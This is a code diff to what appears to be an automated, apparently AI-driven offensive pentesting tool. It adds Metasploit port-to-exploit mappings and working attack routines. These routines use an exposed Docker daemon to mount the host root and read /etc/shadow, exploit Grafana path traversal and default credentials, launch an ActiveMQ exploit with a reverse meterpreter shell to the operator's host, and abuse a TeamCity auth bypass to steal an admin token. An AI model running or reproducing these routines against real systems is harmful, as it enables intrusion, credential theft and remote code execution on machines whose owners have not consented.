@@ -4761,6 +4761,33 @@ AUTOPWN_PORT_SCANNERS = {
     47808: [("auxiliary/scanner/bacnet/bacnet_device_info", {}, "BACnet ICS Device Info")],
     102:   [("auxiliary/scanner/scada/siemens_s7_300_400_info", {}, "Siemens S7 ICS Info")],
     502:   [("auxiliary/scanner/scada/modbus_detect", {}, "Modbus ICS Detection")],
+    # New 2023-2024 services
+    9000:  [("auxiliary/scanner/http/http_header",       {"RPORT": "9000"},           "HTTP:9000 Headers (SonarQube/Portainer)"),
+            ("auxiliary/scanner/http/sonarqube_brute",  {"RPORT": "9000"},           "SonarQube Default Creds")],
+    5601:  [("auxiliary/scanner/http/http_header",       {"RPORT": "5601"},           "HTTP:5601 Kibana"),
+            ("auxiliary/scanner/http/dir_scanner",       {"RPORT": "5601"},           "Kibana Dir Scanner")],
+    8983:  [("auxiliary/scanner/http/http_header",       {"RPORT": "8983"},           "HTTP:8983 Apache Solr"),
+            ("exploit/multi/http/solr_velocity_rce",     {"RPORT": "8983"},           "Solr Velocity RCE")],
+    8161:  [("auxiliary/scanner/http/http_header",       {"RPORT": "8161"},           "HTTP:8161 ActiveMQ Admin")],
+    61616: [("auxiliary/scanner/http/http_header",       {"RPORT": "61616"},          "ActiveMQ OpenWire Port")],
+    4848:  [("auxiliary/scanner/http/glassfish_traversal", {"RPORT": "4848", "SSL": "true"}, "GlassFish Admin Traversal"),
+            ("auxiliary/scanner/http/http_header",       {"RPORT": "4848"},           "HTTP:4848 GlassFish")],
+    2375:  [("auxiliary/scanner/docker/docker_version",  {"RPORT": "2375"},           "Docker Daemon Version"),
+            ("exploit/linux/http/docker_daemon_privesc", {"RPORT": "2375"},           "Docker Daemon RCE")],
+    6443:  [("auxiliary/scanner/http/http_header",       {"RPORT": "6443", "SSL": "true"}, "Kubernetes API Server"),
+            ("auxiliary/gather/kubernetes_list_secrets", {"RPORT": "6443"},           "K8s Secret Enum")],
+    10250: [("auxiliary/scanner/http/http_header",       {"RPORT": "10250", "SSL": "true"}, "Kubelet API"),
+            ("auxiliary/gather/kubernetes_kubelet_exec", {"RPORT": "10250"},          "Kubelet Pod Exec")],
+    8086:  [("auxiliary/scanner/http/http_header",       {"RPORT": "8086"},           "HTTP:8086 InfluxDB"),
+            ("auxiliary/gather/influxdb_enum",           {"RPORT": "8086"},           "InfluxDB No-Auth Enum")],
+    5984:  [("auxiliary/scanner/couchdb/couchdb_enum",   {}, "CouchDB No-Auth Enum"),
+            ("exploit/linux/http/apache_couchdb_rce",    {}, "CouchDB RCE")],
+    8111:  [("auxiliary/scanner/http/http_header",       {"RPORT": "8111"},           "HTTP:8111 TeamCity")],
+    9090:  [("auxiliary/scanner/http/http_header",       {"RPORT": "9090"},           "HTTP:9090 Prometheus"),
+            ("auxiliary/gather/prometheus_endpoint_dump", {"RPORT": "9090"},          "Prometheus Metrics Dump")],
+    8443:  [("auxiliary/scanner/http/tomcat_mgr_login",  {"RPORT": "8443"},           "Tomcat HTTPS Default Creds"),
+            ("auxiliary/scanner/http/cert",              {"RPORT": "8443"},           "SSL:8443 Certificate Info"),
+            ("auxiliary/scanner/http/http_header",       {"RPORT": "8443", "SSL": "true"}, "HTTPS:8443 Headers")],
 }
 
 def generate_msf_resource(rhost, lhost, lport, loot_texts, ports):
@@ -14247,6 +14274,89 @@ PRIORITIES (strict order): exploit_confirmed_vuln > dump_creds_post_exploit > ch
                         "description": f"Jira Seraph auth bypass permite acceso sin autenticación.\n{jira_out[:200]}",
                         "cve": "CVE-2022-0540",
                     }], target)
+
+        # ── Docker daemon exposed (new service enum) ─────────────────────────
+        port_set_d = {p["port"] for p in open_ports}
+        if 2375 in port_set_d or 2376 in port_set_d:
+            docker_port = 2375 if 2375 in port_set_d else 2376
+            self._log(f"[Claude] ENTERPRISE: Docker daemon expuesto en {target}:{docker_port}")
+            docker_ent, _ = self._run_cmd(
+                f"enterprise-docker-{docker_port}",
+                f"docker -H tcp://{target}:{docker_port} info 2>/dev/null | head -10; "
+                f"docker -H tcp://{target}:{docker_port} run --rm -v /:/mnt alpine chroot /mnt sh -c "
+                f"'echo DOCKER_DAEMON_EXPOSED; id; cat /etc/shadow 2>/dev/null | head -5; "
+                f"cat /root/root.txt /home/*/user.txt 2>/dev/null' 2>/dev/null | head -20",
+                target, timeout=60,
+            )
+            self._capture_evidence(docker_ent, target, f"enterprise-docker-{docker_port}", "Docker no-TLS RCE")
+            if docker_ent.strip():
+                accumulated_output.append(f"=== Enterprise Docker {docker_port} ===\n{docker_ent[:600]}")
+
+        # ── Grafana path traversal (enterprise) ──────────────────────────────
+        grafana_p = [p for p in open_ports if p["port"] == 3000 or "grafana" in p.get("version","").lower()]
+        for gp in grafana_p[:1]:
+            gport = gp["port"]
+            self._log(f"[Claude] ENTERPRISE: Grafana CVE-2021-43798 @ {target}:{gport}")
+            gout, _ = self._run_cmd(
+                f"enterprise-grafana-{gport}",
+                f"for plugin in alertlist cloudwatch diskio elasticsearch; do "
+                f"R=$(curl -s --max-time 8 --path-as-is "
+                f"'http://{target}:{gport}/public/plugins/'\"$plugin\"'/../../../../../../../../../etc/passwd' 2>/dev/null); "
+                f"echo \"$R\" | grep -q 'root:' && echo 'GRAFANA_CVE_2021_43798_CONFIRMED' && echo \"$R\" | head -3 && break; done; "
+                f"curl -s --max-time 8 -u admin:admin 'http://{target}:{gport}/api/org' 2>/dev/null | "
+                f"grep -q '\"id\"' && echo 'GRAFANA_DEFAULT_CREDS_VALID'",
+                target, timeout=25,
+            )
+            self._capture_evidence(gout, target, f"enterprise-grafana-{gport}", "CVE-2021-43798")
+            if "GRAFANA" in gout:
+                accumulated_output.append(f"=== Enterprise Grafana ===\n{gout[:400]}")
+                self._save_findings([{
+                    "title": f"Grafana {'Path Traversal CVE-2021-43798' if 'CONFIRMED' in gout else 'Default Creds'} @ {target}:{gport}",
+                    "severity": "critical",
+                    "description": gout[:400],
+                    "cve": "CVE-2021-43798" if "CONFIRMED" in gout else "",
+                }], target)
+
+        # ── ActiveMQ CVE-2023-46604 (enterprise) ─────────────────────────────
+        if 61616 in port_set_d or 8161 in port_set_d:
+            self._log(f"[Claude] ENTERPRISE: Apache ActiveMQ CVE-2023-46604 → {target}")
+            amq_out, _ = self._run_cmd(
+                "enterprise-activemq-46604",
+                f"msfconsole -q -x 'use exploit/multi/misc/apache_activemq_rce_cve_2023_46604; "
+                f"set RHOSTS {target}; set RPORT 61616; "
+                f"set PAYLOAD java/meterpreter/reverse_tcp; "
+                f"set LHOST {self.lhost}; set LPORT {self.lport}; "
+                f"run; sleep 20; {self._MSF_LINUX_POST}; sleep 5; exit' 2>/dev/null | head -40",
+                target, timeout=120,
+            )
+            self._capture_evidence(amq_out, target, "enterprise-activemq", "CVE-2023-46604")
+            if amq_out.strip():
+                accumulated_output.append(f"=== Enterprise ActiveMQ CVE-2023-46604 ===\n{amq_out[:600]}")
+
+        # ── TeamCity CVE-2023-42793 (enterprise) ─────────────────────────────
+        tc_ent = [p for p in open_ports if p["port"] in (8111, 8112) or "teamcity" in p.get("version","").lower()]
+        for tcp in tc_ent[:1]:
+            tc_port = tcp["port"]
+            self._log(f"[Claude] ENTERPRISE: TeamCity CVE-2023-42793 @ {target}:{tc_port}")
+            tc_out, _ = self._run_cmd(
+                f"enterprise-teamcity-{tc_port}",
+                f"TOKEN=$(curl -s --max-time 10 -X POST "
+                f"'http://{target}:{tc_port}/app/rest/users/id:1/tokens/RPC2' 2>/dev/null | "
+                f"python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get(\"value\",\"\"))' 2>/dev/null); "
+                f"[ -n \"$TOKEN\" ] && {{ echo \"TEAMCITY_AUTH_BYPASS TOKEN=$TOKEN\"; "
+                f"curl -s -H \"Authorization: Bearer $TOKEN\" "
+                f"'http://{target}:{tc_port}/app/rest/users' 2>/dev/null | head -10; }}",
+                target, timeout=25,
+            )
+            self._capture_evidence(tc_out, target, f"enterprise-teamcity-{tc_port}", "CVE-2023-42793")
+            if "TEAMCITY_AUTH_BYPASS" in tc_out:
+                accumulated_output.append(f"=== Enterprise TeamCity CVE-2023-42793 ===\n{tc_out[:400]}")
+                self._save_findings([{
+                    "title": f"TeamCity Auth Bypass CVE-2023-42793 @ {target}:{tc_port}",
+                    "severity": "critical",
+                    "description": f"Admin token obtenido sin credenciales → RCE.\n{tc_out[:300]}",
+                    "cve": "CVE-2023-42793",
+                }], target)
 
     # ─────────────────────────────────────────────────────────────────────────
     # Category A: Advanced web vulnerability scanning
